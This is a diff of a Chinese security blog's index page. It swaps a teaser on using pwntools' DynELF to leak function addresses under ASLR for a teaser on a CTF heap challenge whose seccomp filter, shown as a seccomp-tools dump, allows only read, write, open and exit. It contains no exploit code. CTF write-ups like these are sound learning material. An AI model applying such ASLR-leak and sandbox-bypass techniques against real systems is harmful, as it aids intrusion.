-          <h2 id="DynELF简介"><a href="#DynELF简介" class="headerlink" title="DynELF简介"></a>DynELF简介</h2><p>在做漏洞利用的时候，由于ASLR的影响，我们在获取某些函数地址的时候，需要一些特殊操作；一种方法是先泄露出libc.so中的某个函数，然后根据函数之间的偏移，计算我们需要的函数地址，但是这种方法局限于我们需要找到和目标服务器上一样的libc.so，而有些特殊情况下往往找不到对应的libc.so文件；另一种方法就是利用如pwntools的DynELF模块，对内存进行搜索，直到得到我们需要的函数。</p>
+          <h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p>很骚的一题，又是将system禁用的堆类型题目</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwn2 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x04 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0008</span><br><span class="line"> 0004: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0009</span><br><span class="line"> 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009</span><br><span class="line"> 0006: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0009</span><br><span class="line"> 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/03/29/DynELF实现无libc泄露函数地址/#more" rel="contents">
+            <a class="btn" href="/2020/06/21/巅峰极客/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1789,7 +1812,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1800,7 +1823,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -1811,7 +1834,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
